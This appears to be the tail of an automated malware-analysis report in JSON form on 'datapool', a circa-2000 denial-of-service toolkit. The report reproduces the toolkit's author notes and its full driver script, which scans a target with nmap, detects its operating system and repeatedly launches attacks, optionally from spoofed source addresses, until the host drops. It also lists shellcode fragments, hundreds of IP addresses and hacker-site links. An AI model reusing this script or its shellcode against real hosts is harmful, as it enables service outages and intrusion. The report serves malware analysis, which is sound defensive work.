            "#version is up to 1.5.  Have fun with it...=P  oh..and u need the korn",
            "#shell to run this script...since my version of bash bitches when i try to",
            "#use \\c with echo=\\ oh..and just added service names to the port listing=P",
            "#March 28, 2000-",
            "#heh...added some more stuff...just basically gave it more customization...",
            "#no more attacks..yet.  added options to specify source ips...got the new",
            "#ascii...an option to specify line speed...listing of options at startup...",
            "#and fixed a few misc bugs=P  oh and put a limit on the kkill DoS since i",
            "#found it doesn't wanna stop...and script now sends signal to correctly",
            "#terminate lingering executables.  (it works perfectly, except there's a small,",
            "#somewhat annoying message from the shell...but i say better ugly and working",
            "#than pretty and screwed up=P)there's really no way around it...i've tried",
            "#working with background processes and killing it though a job, but it doesn't",
            "#seem to kill it right. (besides killall will wait for the process to die)",
            "#March 27, 2000-",
            "#Been workin on it some more...lots more shit, dunno exaclty what...uhhh",
            "#c-class ip attacks...(i wouldn't recommend it) oh and lemme give a disclaimer:",
            "#I didn't use this script on any computer outside my personal network on a",
            "#testing basis to check the vulnerabilities of my system.  You should not use",
            "#this program for malicious use, becuz if u do it's you're fault, not mine.",
            "#Actually if u do use it you're a loser becuz u didn't write it yourself=P heh",
            "#if ya got probs with the script, mail me at spender@exterminator.net",
            "#oh...new options too...check em out",
            "#btw...please don't abuse the script...i wrote it for educational purposes...=\\",
            "#added an ugly ass ascii too...i think i've been influenced by the DC ghetto",
            "#or something=P",
            "#March 25, 2000-",
            "#Many improvements...new options like port range and \"don't stop till they drop\"",
            "#(heh love that one=P) future options might include a setting where further",
            "#attacks are longer and harder...numofattacks + n =P this script can be run",
            "# without any user intervention whatsoever.  Even attacks that would normally",
            "#require intervention are handled correctly in this program...(eat your heart",
            "#out spikeman=] )  Oh, and there's 69 attacks...that's right, SIXTY-NINE=] ",
            "#(my fav # =P )trying to add more but some are a bitch to compile=\\",
            "#Hope you enjoy! -spender",
            "#Greetz-",
            "#Gridmark, spyropyro(muh gf=P), the ss programming teeem heh=P, vetesgirl cuz",
            "#she's so nice, not the stupid swedish jerk on efnet with nick spender who keeps",
            "#taking it from me=P, all the people who coded the shit used in my script",
            "#If y'all are bored go watch some anime(I recommend Grave of the Fireflies...",
            "#*sniff* =[ ) l8tz",
            "#BTW: this script requires nmap....so pick yourself up a copy and compile it...",
            "#then copy it to either /usr/bin, /usr/local/bin, or in the ./bin directory of",
            "#where this script is. (I can't do everything for you=])",
            "datapool/datapool.sh",
            "0100755",
            "0000000",
            "0000000",
            "00000017411",
            "07101027730",
            "013523",
            "ustar  ",
            "root",
            "root",
            "#!/bin/bash",
            "if [ ! -f ./datapool.fc ]; then",
            "    echo \"Dude, wtf were u thinking?? Don't delete datapool.fc dumbass!!!\"",
            "    exit 1",
            ". ./datapool.fc",
            "clear",
            "ATTACKNM=",
            "SIMULT=1",
            "DONTSTOP=0",
            "SCANONLY=0",
            "LINESPEED=1",
            "WATCHCON=0",
            "SEXYRAN=0",
            "COUNTER1=1",
            "LOGFILE=",
            "PORTLIST=",
            "KEEPGOING=0",
            "trap \"rm -f ./output.txt ; rm -f ./svcname.txt ; rm -f ./output2.txt ; rm -f ./datapool.bk ; ./cleaner.sh 1 ; exit 1\" 1 2 3 15",
            "if [ $# -lt 2 ]; then",
            "    usage",
            "while getopts r:t:p:v:d:i:l:xskac OPTION ; do",
            "    case \"$OPTION\" in",
            "    p) PORTLIST=\"$OPTARG\" ;;",
            "    v) LOGFILE=\"$OPTARG\" ;;",
            "    x) DONTSTOP=1 ;;",
            "    r) ATTACKNM=\"$OPTARG\" ;;",
            "    a) LOOPING=1 ;;",
            "    d) DESTIP=\"$OPTARG\" ;;",
            "    i) SRCIP=\"$OPTARG\" ;;",
            "    c) KEEPGOING=1 ; DONTSTOP=1 ;;",
            "    t) SIMULT=\"$OPTARG\" ;;",
            "    s) SCANONLY=1 ;;",
            "    l) case \"$OPTARG\" in",
            "\tT1) LINESPEED=2 ;;",
            "\tT3) LINESPEED=4 ;;",
            "\tOC3) LINESPEED=6 ;;",
            "\tSlowass) LINESPEED=\"1 / 2\" ;;",
            "\tModem) LINESPEED=1 ;;",
            "       esac ;;",
            "    k) WATCHCON=1 ;;",
            "   \\?) usage ;;",
            "   esac",
            "done",
            "cleaner",
            "if [ -z \"$DESTIP\" ]; then",
            "    usage",
            "nmapcheck",
            "portchg",
            "srcipgen",
            "optionlist",
            "if [ $WATCHCON -eq 0 ]; then",
            "    if [ $KEEPGOING -eq 0 ]; then",
            "    echo \"Checking to see if $DESTIP is alive ...\"",
            "    ping -c3 $DESTIP 1> ./output.txt 2>./output.txt",
            "    ping1=`cat ./output.txt | grep \"unknown host\" -w`",
            "    if [ -n \"$ping1\" ]; then",
            "\trm -f ./output.txt",
            "\techo \"Invalid host...exiting.\"",
            "\texit 9",
            "    fi ",
            "    ping=`cat ./output.txt | grep \"100%\" -w `",
            "    rm -f ./output.txt",
            "    if [ \"$ping\" = \"3 packets transmitted, 0 packets received, 100% packet loss\" ]; then",
            "        echo \"Host is unavailable, exiting...\"",
            "\tif [ -n \"$LOGFILE\" ]; then",
            "\t    echo \"-----------------------------\" >> \"$LOGFILE\"",
            "\texit 2",
            "    else",
            "        echo \"Host is alive, starting portscan...\"",
            "    fi",
            "    else",
            "\techo \"Starting portstan...\"",
            "    fi",
            "else",
            "    echo \"Watching connection...\"",
            "    HOSTFOUND=0",
            "    while [ $HOSTFOUND -eq 0 ]; do",
            "        ping=`ping -c2 $DESTIP | grep 100%`",
            "\tif [ \"$ping\" = \"2 packets transmitted, 0 packets received, 100% packet loss\" ]; then",
            "\t    printf \".\"",
            "\telse",
            "            echo \"Host is alive, starting portscan...\"",
            "\t    if [ -n \"$LOGFILE\" ]; then",
            "\t        echo \"$DESTIP\" >> \"$LOGFILE\"",
            "\t    fi",
            "\t    HOSTFOUND=1",
            "\tsleep 5",
            "    done",
            "case \"$LINESPEED\" in",
            "\"1 / 2\")",
            "    \"$NMAPDIR\" -sS -P0 -O -T Polite -p $PORTLIST $DESTIP 1> ./output.txt 2> ./output.txt ;;",
            "    \"$NMAPDIR\" -sS -P0 -O -p $PORTLIST $DESTIP 1> ./output.txt 2> ./output.txt ;;",
            "    \"$NMAPDIR\" -sS -P0 -T Aggressive -O -p $PORTLIST $DESTIP 1> ./output.txt 2> ./output.txt ;;",
            "4|6)",
            "    \"$NMAPDIR\" -sS -P0 -T Insane -O -p $PORTLIST $DESTIP 1> ./output.txt 2> ./output.txt ;;",
            "esac",
            "ipcalc $DESTIP 1>/dev/null 2>/dev/null",
            "if [ $? = 1 ]; then",
            "    HOSTERR=`cat ./output.txt | grep \"No ports open for host\" -w`",
            "    if [ -z \"$HOSTERR\" ]; then",
            "\tDESTIP1=`cat ./output.txt | grep \"Interesting ports on\" -w | cut -d\\( -f2 | cut -d\\) -f1`",
            "\techo \"$DESTIP resolved to $DESTIP1\"",
            "\tDESTIP=$DESTIP1",
            "    else",
            "\tDESTIP1=`cat ./output.txt | grep \"No ports open for host\" -w | cut -d\\( -f2 | cut -d\\) -f1`",
            "\techo \"$DESTIP resolved to $DESTIP1\"",
            "\tDESTIP=$DESTIP1",
            "    fi",
            "else",
            "    HOSTERR=`cat ./output.txt | grep \"No ports open for host\" -w`",
            "    if [ -z \"$HOSTERR\" ]; then",
            "\tDESTIP1=`cat ./output.txt | grep \"Interesting ports on\" -w | cut -b22- | cut -d\\( -f1`",
            "\techo \"$DESTIP resolved to $DESTIP1\"",
            "    else",
            "\tDESTIP1=`cat ./output.txt | grep \"No ports open for host\" -w | cut -b24- | cut -d\\( -f1`",
            "\techo \"$DESTIP resolved to $DESTIP1\"",
            "    fi",
            "OS=`cat ./output.txt | grep \"Remote operating system\" -w`",
            "cat ./output.txt| grep open -w | grep /tcp > ./output.txt",
            "cat ./output.txt | cut -b24- > ./svcname.txt",
            "cat ./output.txt | cut -d/ -f1 > ./output.txt",
            "OUTPUT=`cat ./output.txt -n | grep 1 -w | cut -b8-`",
            "if [ -z \"$OUTPUT\" ]; then",
            "    echo \"No ports found.\"",
            "    if [ -n \"$LOGFILE\" ]; then",
            "\techo \"No Ports\" >> \"$LOGFILE\"",
            "    fi",
            "    if [ -f ./svcname.txt ]; then",
            "        rm -f ./svcname.txt",
            "    fi",
            "    if [ -f ./output2.txt ]; then",
            "\trm -f ./output2.txt",
            "    fi",
            "    while true ; do",
            "    if [ $COUNTER1 -eq 2 ]; then",
            "    if [ $KEEPGOING -eq 0 ]; then",
            "        echo \"Attack Complete!\"",
            "        echo \"Checking to see if $DESTIP is still alive ...\"",
            "        ping=`ping -c3 $DESTIP | grep 100%`",
            "\tif [ \"$ping\" = \"3 packets transmitted, 0 packets received, 100% packet loss\" ]; then",
            "            dropcheck",
            "        else",
            "\t    if [ $DONTSTOP -eq 1 ]; then",
            "\t        COUNTER1=0",
            "    \t    else",
            "\t\techo \"He's still alive=\\ You might wanna try again...\"",
            "\t\tif [ -n \"$LOGFILE\" ]; then",
            "\t\t    echo \"-----------------------------\" >> \"$LOGFILE\"",
            "\t\tfi",
            "    \t\t./cleaner.sh 5",
            "\t\texit 5",
            "\t    fi",
            "    else",
            "    COUNTER1=0",
            "    fi",
            "    else ",
            "\techo \"Launching $SIMULT attack(s) at $DESTIP\"",
            "\tx5=1",
            "\twhile [ $x5 -le $SIMULT ]; do",
            "    \tif [ $x5 -eq $SIMULT ]; then",
            "\tif [ -z \"$ATTACKNM\" ]; then",
            "\tNoPorts",
            "\telse",
            "\t$ATTACKNM",
            "\telse",
            "\tif [ -z \"$ATTACKNM\" ]; then",
            "\tNoPorts 1>/dev/null 2>&1 &",
            "\telse",
            "\t$ATTACKNM 1>/dev/null 2>&1 &",
            "\tx5=`expr $x5 + 1`",
            "\tdone",
            "    fi    ",
            "    COUNTER1=`expr $COUNTER1 + 1`",
            "    done     \t ",
            "OSCHECK=`echo \"$OS\" | grep \"Windows\"`",
            "if [ -z \"$OSCHECK\" ]; then",
            "    OSCHECK=`echo \"$OS\" | grep Linux`",
            "    if [ -z \"$OSCHECK\" ]; then",
            "\tOSCHECK=`echo \"$OS\" | grep BSD`",
            "        if [ -z \"$OSCHECK\" ]; then",
            "\t    OS=\"All\"",
            "\telse",
            "\t    OS=\"BSD\"",
            "    else",
            "\tOS=\"Linux\"",
            "    fi",
            "else",
            "    OS=\"Windows 9x\"",
            "if [ -n \"$LOGFILE\" ]; then",
            "    echo \"$OS\" >> \"$LOGFILE\"",
            "while read LINE",
            "    cat ./svcname.txt -n | grep $i -w | cut -b8- > ./output3.txt",
            "    TESTING=`cat ./output3.txt | wc -l | cut -b7-`",
            "    if [ $TESTING -ne 1 ]; then",
            "        x=1",
            "\twhile read LINE3",
            "        do",
            "\t    if [ $x -eq 1 ]; then",
            "\t\tLINE2=\"$LINE3\"",
            "\t    fi",
            "\t    x=`expr $x + 1`",
            "\tdone < \"./output3.txt\"",
            "    else",
            "\tLINE2=`cat ./output3.txt`",
            "    fi",
            "    rm ./output3.txt",
            "    echo \"$LINE/$LINE2\" >> ./output2.txt",
            "    i=`expr $i + 1`",
            "done < \"./output.txt\"",
            "cat ./output2.txt > ./output.txt",
            "rm -f ./output2.txt",
            "rm -f ./svcname.txt",
            "NUMPORTS=`cat ./output.txt | wc -l | cut -b-8`",
            "OUTPUTLIST=`cat ./output.txt`",
            "if [ -n \"$LOGFILE\" ]; then",
            "    echo \"Open ports:\" >> \"$LOGFILE\"",
            "    echo \"$OUTPUTLIST\" >> \"$LOGFILE\"",
            "case $OS in",
            "    \"Linux\") echo \"Linux host detected...\" ;;",
            "    \"Windows 9x\") echo \"Windows 9x/NT/2000 host detected...\" ;;",
            "    \"BSD\") echo \"BSD host detected...\" ;;",
            "    \"All\") echo \"OS could not be detected. Running all attacks...\" ;;",
            "esac    ",
            "NUMPORTS=`echo $NUMPORTS `",
            "echo \"$NUMPORTS TCP port(s) were found open:\"",
            "echo \"$OUTPUTLIST\"",
            "if [ $SCANONLY -eq 1 ]; then",
            "    echo \"Scan of $DESTIP complete.\"",
            "    if [ -n \"$LOGFILE\" ]; then",
            "\techo \"-----------------------------\" >> \"$LOGFILE\"",
            "    fi",
            "    exit 4",
            "while true ; do",
            "    OUTPUT=`cat ./output.txt -n | grep $COUNTER1 -w | cut -b8- | cut -d/ -f1`",
            "    if [ -z \"$OUTPUT\" ]; then",
            "\tif [ $DONTSTOP -eq 1 ]; then",
            "\t    DONTSTOPPER",
            "        fi",
            "    fi",
            "    if [ -z \"$OUTPUT\" ]; then",
            "\techo \"Attack Complete!\"",
            "        echo \"Checking to see if $DESTIP is still alive ...\"",
            "        ping=`ping -c3 $DESTIP | grep 100%`",
            "\t        ",
            "\tif [ \"$ping\" = \"3 packets transmitted, 0 packets received, 100% packet loss\" ]; then",
            "\t    dropcheck",
            "        else",
            "\t    echo \"He's still alive=\\ You might wanna try again...\"",
            "\t    if [ -n \"$LOGFILE\" ]; then",
            "\t\techo \"-----------------------------\" >> \"$LOGFILE\"",
            "\t    fi",
            "\t    ./cleaner.sh 5",
            "\t    exit 5",
            "    else ",
            "        echo \"Launching $SIMULT attack(s) at $DESTIP on port: $OUTPUT\"",
            "\tx5=1",
            "\twhile [ $x5 -le $SIMULT ]; do",
            "\tif [ $x5 -eq $SIMULT ]; then",
            "\tif [ -z \"$ATTACKNM\" ]; then",
            "\tcase $OS in",
            "\t    \"Linux\") LinuxAttack ;;",
            "\t    \"Windows 9x\") WinAttack ;;",
            "\t    \"BSD\") BSDAttack ;;",
            "    \t    \"All\") FullAttack ;;",
            "\tesac",
            "\telse",
            "\t$ATTACKNM",
            "\telse",
            "\tif [ -z \"$ATTACKNM\" ]; then",
            "\tcase $OS in",
            "\t    \"Linux\") LinuxAttack 1>/dev/null 2>&1 &;;",
            "\t    \"Windows 9x\") WinAttack 1>/dev/null 2>&1 &;;",
            "\t    \"BSD\") BSDAttack 1>/dev/null 2>&1 &;;",
            "    \t    \"All\") FullAttack 1>/dev/null 2>&1 &;;",
            "\tesac",
            "\telse",
            "\t$ATTACKNM 1>/dev/null 2>&1 &",
            "\tx5=`expr $x5 + 1`",
            "\tdone    ",
            "    fi    ",
            "    \t",
            "    COUNTER1=`expr $COUNTER1 + 1`",
            "done     \t ",
            "datapool/cleaner.sh",
            "0100755",
            "0000000",
            "0000000",
            "00000000343",
            "07101027762",
            "013332",
            "ustar  ",
            "root",
            "root",
            "#!/bin/bash",
            "rm -f ./output.txt ; rm -f ./svcname.txt ; rm -f ./output2.txt ; rm -f ./datapool.bk ; killall -9 -w datapool.sh 1>/dev/null 2>&1 ; for KILLER in ./bin/* ; do killall -9 -w $KILLER 1>/dev/null 2>&1 ; done ; exit $@",
            "datapool/rants",
            "0100644",
            "0000000",
            "0000000",
            "00000005202",
            "07101154060",
            "012423",
            "ustar  ",
            "root",
            "root",
            "weee...well this is a section just for me...where i'll put whatever i'm",
            "thinkin...mebbe one day u'll get as bored as i am right now and read it.  mebbe",
            "something i'll say will change your mind on something...maybe it'll just piss",
            "u off..either way i don't care=P  well ummm...many people know me already...",
            "i've been just about everywhere;)  but right now my current status is channel",
            "wh0re...if u want me in ur chan i want u to know that ur gonna haveta give me",
            "something...it seems whenever i get put in a chan it somehow livens up;)",
            "kinda strange since i'm generally an extremely shy guy(who isn't right?) well",
            "umm....i'm always looking for new friends...especially nice ones heh..they're ",
            "usually better than ones that piss me off=P  tho as u can probably tell i'm ",
            "not nearly as bitchy as some people u may know...mebbe becuz i'm lame and i",
            "don't have a billion ppl msgin me on irc=P  (sup sys-edit;) ) either way...",
            "i'm a nice guy and like talkin to people...generally glad to answer questions",
            "unless u want me to do all the work for u, in which case u better pay me or",
            "i ain't doin shit.  ummm....learning is good...i'm always eager to learn new",
            "stuff or teach other people stuff i've learned..so it's all good.  i don't",
            "really consider myself a script kiddie...mebbe u think so becuz i wrote this",
            "script...but i seriously don't use it...more interested in the scripting and",
            "source editing than anything else...i'm not a 13 year old kid with a little ",
            "dick who needs to feel big and bad...i just wanna learn shit...if people don't",
            "teach me, i learn by myself.  Only thing that kinda has sucked tho is that",
            "people haven't really tought me anything so i pretty much learned everything",
            "myself=\\  which is ok becuz i got too much free time on my hands..  today i",
            "was thinkin \"spender why don't u write up some shit or something\" well i was",
            "gonna write up some docs and shit on stuff...but then i thought...naaaah...then",
            "i thought mebbe i could write my own code of some shit...wait a min..that's",
            "a pretty damn good idea...time for me to start c0din shit;) bout time i learned",
            "dammit.......umm...btw feds suck becuz they pick on kids for no reason...",
            "kinda funny tho is that they generally only get the script kids=\\  ah well...",
            "i'm not into any of that \"dot slash h4x0r\" stuff (sup seksi;) )  or doin messed",
            "up shit...doesn't seem to require much brains methinks...there's plenty of",
            "idiots out there...i'd rather make the shit that they use than use it myself.",
            "in more than ways than one it's better than bein a stupid script kiddie cuz",
            "they can talk all the shit they want...but i can say i scripted the lame ",
            "shit they were usin;)  bleh well i'm out..enuff crap for today, time 2 c0de."
        ],
        "file": {
            "\t\t-i list=filename.txt": "Text",
            "\t\t-i zone=filename.txt": "Text",
            "\t\tcat ./datapool.bk > ./datapool.db": "Database",
            "\t\techo $DESTIP >> ./datapool.db": "Database",
            "\t\techo $LASTATTACK >> ./datapool.db": "Database",
            "\t    echo \"#  PLEASE DON'T EDIT!!!  #\" >> ./datapool.db": "Database",
            "\t    echo \"##########################\" >> ./datapool.db": "Database",
            "\t    echo $DESTIP >> ./datapool.db": "Database",
            "\t    echo $LASTATTACK >> ./datapool.db": "Database",
            "\trm -f ./output.txt": "Text",
            "\trm -f ./output2.txt": "Text",
            "         > ls -d xyz.com > filename.txt": "Text",
            "        rm -f ./output.txt": "Text",
            "        rm -f ./output2.txt": "Text",
            "        rm -f ./svcname.txt": "Text",
            "    ./bin/ruc $DESTIP $OUTPUT 1>/dev/null 2>&1 & TEST=1 ; while [ $TEST -le `expr 15 \"*\" $LINESPEED` ] ; do sleep 1 ; printf \".\" ; TEST=`expr $TEST + 1` ; done ; echo \"DONE!\" ; killall -9 -q ruc 1>/dev/null 2>&1 ; killall -9 -w -q ruc 1>/dev/null 2>&1 ; rm -f ./ruckuS.log": "Log",
            "    cat ./svcname.txt -n | grep $i -w | cut -b8- > ./output3.txt": "Text",
            "    echo \"$LINE/$LINE2\" >> ./output2.txt": "Text",
            "    ping -c3 $DESTIP 1> ./output.txt 2>./output.txt": "Text",
            "    rm -f ./output.txt": "Text",
            "    rm ./output3.txt": "Text",
            " * http://www.microsoft.com/technet/security/bulletin/fq00-013.asp": "Web Page",
            "#Anywayz...on to the new options=P  there's an option for line speed...so": "Executable",
            "Line 2 requires all the information about xyz.com be written to filename.txt": "Text",
            "cat ./output.txt | cut -b24- > ./svcname.txt": "Text",
            "cat ./output.txt | cut -d/ -f1 > ./output.txt": "Text",
            "cat ./output.txt| grep open -w | grep /tcp > ./output.txt": "Text",
            "cat ./output2.txt > ./output.txt": "Text",
            "echo \"$RESPONSE$i.$b.$x3\" >> ./ips.txt": "Text",
            "echo \"$RESPONSE$i.$x3\" >> ./ips.txt": "Text",
            "echo \"$RESPONSE$x\" >> ./ips.txt": "Text",
            "rm -f ./output2.txt": "Text",
            "rm -f ./svcname.txt": "Text",
            "ruckuS.log": "Log"
        },
        "fuzzing": {
            "Possible encoded string": [
                "\"\\xcd\\x80\\xe8\\x89\\xff\\xff\\xff/bin/sh\";",
                "\t\"\\x58\\xb4\\x50\\x66\\xab\\x58\\xab\\xab\\xab\\xb1\\x21\\x90\""
            ],
            "String too long": [
                "\"9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
                "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999\";",
                "9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999",
                "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"
            ]
        },
        "ip": [
            "149.106.37.197",
            "209.144.56.16",
            "131.151.52.105",
            "195.162.196.42",
            "194.126.80.142",
            "165.91.21.113",
            "203.61.156.164",
            "129.128.54.168",
            "24.3.132.9",
            "209.172.129.66",
            "208.240.197.32",
            "199.72.175.4",
            "203.23.237.110",
            "208.255.165.53",
            "207.8.164.27",
            "216.65.157.101",
            "165.166.140.122",
            "205.228.248.27",
            "2.7.2.1",
            "199.247.156.6",
            "203.61.156.165",
            "206.248.16.16",
            "198.87.96.254",
            "35.8.144.96",
            "207.51.86.22",
            "206.31.102.16",
            "208.203.244.13",
            "203.59.24.229",
            "141.219.81.85",
            "150.156.210.232",
            "38.156.101.2",
            "159.134.244.133",
            "194.125.148.2",
            "203.45.23.123",
            "208.18.129.2",
            "199.72.175.156",
            "128.252.22.47",
            "208.137.139.8",
            "128.113.161.123",
            "127.0.0.1",
            "207.236.41.30",
            "171.64.65.70",
            "192.124.43.75",
            "204.157.39.7",
            "204.177.71.250",
            "206.149.80.99",
            "195.94.179.5",
            "205.139.35.22",
            "200.255.96.24",
            "206.154.216.100",
            "128.2.74.204",
            "203.17.23.13",
            "193.13.231.151",
            "209.29.65.3",
            "129.21.114.129",
            "204.91.237.250",
            "202.49.244.17",
            "206.154.138.8",
            "198.106.23.1",
            "205.139.62.15",
            "207.13.110.4",
            "139.174.248.165",
            "208.45.42.111",
            "207.96.243.5",
            "208.130.10.26",
            "207.87.203.20",
            "132.230.153.50",
            "131.111.226.98",
            "208.23.24.79",
            "206.186.72.103",
            "207.0.164.8",
            "148.217.2.200",
            "209.30.67.88",
            "204.253.208.245",
            "194.117.157.74",
            "207.239.212.107",
            "195.170.128.5",
            "208.134.73.42",
            "204.141.86.42",
            "204.213.176.8",
            "208.0.122.12",
            "195.74.0.69",
            "202.188.101.246",
            "10.1.2.1",
            "206.196.57.130",
            "200.255.216.11",
            "206.147.58.45",
            "209.12.170.11",
            "2.7.2.3",
            "128.95.25.184",
            "129.186.121.53",
            "198.106.166.188",
            "100.1.2.3",
            "192.52.220.101",
            "203.15.24.46",
            "203.30.239.5",
            "195.96.122.8",
            "200.248.149.31",
            "207.99.85.67",
            "199.202.71.203",
            "130.241.142.10",
            "203.17.23.9",
            "136.159.102.88",
            "198.101.39.41",
            "128.143.244.38",
            "209.12.13.20",
            "207.171.0.68",
            "207.207.248.20",
            "200.246.52.4",
            "206.183.143.4",
            "206.98.138.165",
            "207.207.32.130",
            "198.17.249.14",
            "192.88.209.18",
            "134.193.111.241",
            "207.78.244.40",
            "209.51.213.12",
            "200.239.253.14",
            "200.255.218.41",
            "193.13.231.149",
            "198.161.102.18",
            "206.83.174.10",
            "207.206.65.5",
            "198.161.102.213",
            "205.217.206.189",
            "195.173.25.34",
            "207.0.129.183",
            "205.216.83.5",
            "209.122.33.45",
            "206.230.102.9",
            "134.205.131.22",
            "206.191.0.209",
            "153.35.85.255",
            "205.177.27.190",
            "194.143.8.153",
            "128.206.92.47",
            "141.219.83.69",
            "205.164.220.20",
            "207.173.16.53",
            "10.1.2.254",
            "156.46.147.17",
            "160.45.32.176",
            "129.15.3.37",
            "144.92.243.243",
            "130.240.195.72",
            "207.67.188.25",
            "24.1.226.74",
            "128.163.161.105",
            "204.171.44.26",
            "192.89.182.26",
            "206.112.1.31",
            "143.195.150.40",
            "129.15.3.38",
            "207.239.192.51",
            "207.99.85.69",
            "195.90.193.138",
            "194.65.5.103",
            "192.107.41.7",
            "130.237.233.111",
            "209.98.3.217",
            "148.202.1.5",
            "165.166.140.160",
            "38.241.229.103",
            "100.100.100.102",
            "207.243.123.2",
            "165.166.140.140",
            "34.224.14.118",
            "0159.134.244.134",
            "100.100.100.101",
            "194.19.128.13",
            "208.4.5.9",
            "204.177.71.10",
            "128.52.38.15",
            "207.40.196.13",
            "207.13.5.18",
            "209.155.24.25",
            "206.196.153.201",
            "207.65.182.12",
            "204.177.39.44",
            "207.87.203.28",
            "147.188.209.113",
            "200.241.222.88",
            "208.212.201.9",
            "194.229.154.41",
            "206.25.206.10",
            "144.92.218.112",
            "128.52.42.22",
            "128.164.141.5",
            "207.239.212.113",
            "208.0.188.6",
            "193.164.183.3",
            "203.17.103.34",
            "137.48.127.127",
            "207.201.91.8",
            "204.254.98.11",
            "207.25.220.40",
            "207.123.126.4",
            "194.229.103.195",
            "200.248.241.1",
            "207.198.211.22",
            "205.163.58.20",
            "144.92.229.122",
            "208.225.207.3",
            "204.170.191.6",
            "193.74.114.41",
            "207.126.70.69",
            "195.224.47.44",
            "194.158.161.28",
            "159.134.244.134",
            "204.210.15.71",
            "203.32.8.197",
            "209.192.31.148",
            "1.1.1.1",
            "206.149.144.14",
            "195.18.128.10",
            "206.103.0.200",
            "200.250.234.39",
            "132.235.197.72",
            "209.48.89.1",
            "140.247.155.208",
            "202.218.50.24",
            "165.91.20.158",
            "128.1.1.1",
            "196.25.1.132",
            "207.239.212.244",
            "204.216.126.250",
            "206.96.251.44",
            "206.246.194.15",
            "205.218.60.98",
            "153.35.95.255",
            "204.119.24.237",
            "200.241.188.3",
            "204.171.58.6",
            "130.236.249.227",
            "137.123.210.80",
            "200.18.178.14",
            "207.175.30.130",
            "200.255.244.2",
            "194.239.134.18",
            "130.234.16.21",
            "165.166.144.45",
            "204.216.126.251",
            "200.18.178.7",
            "207.218.51.13",
            "130.63.74.16",
            "144.92.111.117",
            "207.64.79.1",
            "208.201.224.211",
            "199.217.218.8",
            "165.91.3.91",
            "198.83.6.70",
            "207.106.42.14",
            "129.13.209.22",
            "165.166.140.111",
            "204.210.15.62",
            "208.137.128.24",
            "255.255.255.255",
            "195.94.179.25",
            "203.55.240.1",
            "208.194.67.16",
            "129.21.112.194",
            "194.144.237.50",
            "167.114.26.50",
            "203.61.156.162",
            "200.246.163.6",
            "143.44.100.20",
            "128.175.46.96",
            "206.41.136.94",
            "194.125.2.219",
            "10.1.2.2",
            "194.42.225.247",
            "147.83.61.32",
            "207.48.50.10",
            "206.53.116.243",
            "209.26.6.121",
            "194.213.72.22",
            "204.216.57.249",
            "134.147.141.98",
            "194.109.6.217",
            "209.49.51.98",
            "192.124.43.73",
            "208.0.122.11",
            "207.172.7.66",
            "128.230.33.90",
            "194.109.6.220",
            "130.126.195.94",
            "12.72.1.37",
            "195.74.96.45",
            "205.139.59.121",
            "205.23.45.223",
            "194.64.176.5",
            "199.217.218.7",
            "193.116.54.15",
            "203.87.2.13",
            "207.19.125.13",
            "207.23.43.3",
            "199.67.51.102",
            "204.177.184.31",
            "169.197.1.154",
            "195.66.200.101",
            "201.12.3.76",
            "203.16.135.34",
            "204.90.102.49",
            "207.254.73.2",
            "163.1.138.204",
            "151.198.193.6",
            "207.18.86.50",
            "207.212.176.26",
            "204.97.179.4",
            "206.171.181.1",
            "129.15.3.39",
            "194.109.6.218",
            "207.3.64.52",
            "159.134.244.132",
            "128.2.237.78",
            "140.180.143.197",
            "132.230.63.23",
            "200.246.0.248",
            "62.136.15.45",
            "204.220.36.31",
            "207.206.116.41",
            "206.98.138.162",
            "207.152.95.9",
            "206.246.194.16",
            "200.246.227.44",
            "203.19.214.28",
            "206.251.130.20",
            "209.36.105.50",
            "192.246.40.42",
            "38.233.80.136",
            "206.154.148.145",
            "206.25.117.125",
            "157.182.246.58",
            "204.202.54.95",
            "202.27.184.4",
            "206.129.112.27",
            "128.138.149.62",
            "200.241.93.2",
            "200.246.5.28",
            "200.24.34.116",
            "153.35.85.1",
            "207.65.218.15",
            "206.83.174.9",
            "205.219.23.3",
            "198.164.230.15",
            "128.253.185.87",
            "200.246.248.9",
            "204.248.210.20",
            "205.199.137.12",
            "146.227.105.5",
            "204.254.98.15",
            "206.230.18.20",
            "199.247.126.23",
            "140.233.207.207",
            "204.49.131.19",
            "205.189.151.3",
            "209.112.14.200",
            "206.20.111.7",
            "194.243.65.2",
            "136.201.40.50",
            "148.176.238.89",
            "207.53.96.12",
            "199.67.51.101",
            "200.34.211.10",
            "199.76.206.54",
            "208.153.58.17",
            "193.252.19.3",
            "207.170.48.24",
            "153.35.85.32",
            "207.166.192.85",
            "204.216.27.8",
            "203.23.47.43",
            "89.89.89.89",
            "203.29.160.21",
            "207.30.184.9",
            "205.197.242.62",
            "204.253.208.225",
            "209.90.128.16",
            "24.0.147.54",
            "207.114.144.200",
            "194.100.105.71",
            "204.209.212.5",
            "193.88.50.50",
            "18.238.0.24",
            "129.2.237.36",
            "195.238.2.30",
            "194.204.5.25",
            "129.21.113.71",
            "206.98.138.166",
            "200.248.241.2",
            "207.229.129.193",
            "209.51.192.228",
            "153.85.35.32",
            "149.156.159.100"
        ],
        "url": [
            "http://www.ugtop.com/defcon0/index.htm",
            "http://search.cpan.org/",
            "http://www.espada.net/~asta/",
            "http://www.anticode.com.",
            "http://www.microsoft.com/technet/security/bulletin/fq00-013.asp",
            "http://www.openbsd.org/errata24.html#maxqueue",
            "http://www.sekurity-net.com",
            "http://www.b0f.com",
            "http://www.legion2000.org",
            "http://www.rootshell.com/\\n\\n",
            "http://sos.nanko.ru\\n\\n",
            "http://www.secnet.com/sni-advisories/sni-26.ascendrouter.advisory.html",
            "http://teso.scene.at/",
            "http://www.antionline.com",
            "http://sos.nanko.ru",
            "http://galt.cowofdoom.com/",
            "http://members.xoom.com/i0wnu",
            "http://www.rootshell.com/",
            "http://www.angelfire.com/ar/WarzonE/flu.html"
        ]
    },
    "time": "0:00:03.892908",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "maldoc_getEIP_method_1"
        }
    ]
}
